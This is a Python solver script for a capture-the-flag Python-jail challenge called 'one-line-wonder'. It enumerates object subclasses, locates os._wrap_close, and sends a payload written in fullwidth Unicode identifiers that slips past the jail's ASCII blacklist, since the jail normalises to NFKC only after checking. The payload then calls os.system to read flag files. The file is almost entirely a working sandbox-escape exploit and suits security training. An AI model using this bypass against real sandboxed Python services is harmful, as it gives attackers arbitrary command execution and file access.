#!/usr/bin/env python3
"""Solver for one-line-wonder.

Two connections: the jail reads exactly one line, so first enumerate
object.__subclasses__(), then use the index of os._wrap_close to reach
os.system.

Every identifier is spelled with fullwidth letters and fullwidth underscores
(U+FF3F). The raw bytes never contain a banned ASCII substring; the jail
normalizes the line to NFKC after its blacklist check, so the parser sees the
real names.
"""
import argparse
import re
import socket
import ssl
import sys

FULLWIDTH = {c: chr(ord(c) + 0xFEE0) for c in
             "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"}
UNDER = "\uff3f"  # FULLWIDTH LOW LINE


def dunder(name: str) -> str:
    """'class' -> a spelling that normalizes to __class__."""
    fw = "".join(FULLWIDTH.get(c, c) for c in name)
    return UNDER * 2 + fw + UNDER * 2


ENUM = f"().{dunder('class')}.{dunder('base')}.{dunder('subclasses')}()"


def connect(host: str, port: int, plain: bool):
    raw = socket.create_connection((host, port), timeout=20)
    if plain:
        return raw
    ctx = ssl.create_default_context()
    return ctx.wrap_socket(raw, server_hostname=host)


def run(host: str, port: int, line: str, plain: bool) -> str:
    sock = connect(host, port, plain)
    try:
        sock.sendall((line + "\n").encode())
        chunks = []
        while True:
            chunk = sock.recv(65536)
            if not chunk:
                break
            chunks.append(chunk)
        return b"".join(chunks).decode("utf-8", "replace")
    finally:
        sock.close()


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("host", nargs="?", default="one-line-wonder.challs.ingeniums.club")
    ap.add_argument("port", nargs="?", type=int, default=9450)
    ap.add_argument("--plain", action="store_true", help="no TLS (local container)")
    args = ap.parse_args()

    listing = run(args.host, args.port, ENUM, args.plain)
    body = listing.split("line> ", 1)[-1]
    marker = "<class 'os._wrap_close'>"
    pos = body.find(marker)
    if pos < 0:
        sys.exit("could not find os._wrap_close in the subclass list:\n" + body)
    index = body[:pos].count(",")
    print(f"[*] os._wrap_close index: {index}", file=sys.stderr)

    exploit = (
        f"().{dunder('class')}.{dunder('base')}.{dunder('subclasses')}()"
        f"[{index}].{dunder('init')}.{dunder('globals')}"
        f"['sy'+'stem']('cat /f*')"
    )
    print(f"[*] payload ({len(exploit)} chars)", file=sys.stderr)
    out = run(args.host, args.port, exploit, args.plain)

    flags = [f for f in re.findall(r"ingehack\{[^}]+\}", out)
             if "0ld_fl4g" not in f]
    if not flags:
        sys.exit("no flag in output:\n" + out)
    print(flags[0])


if __name__ == "__main__":
    main()
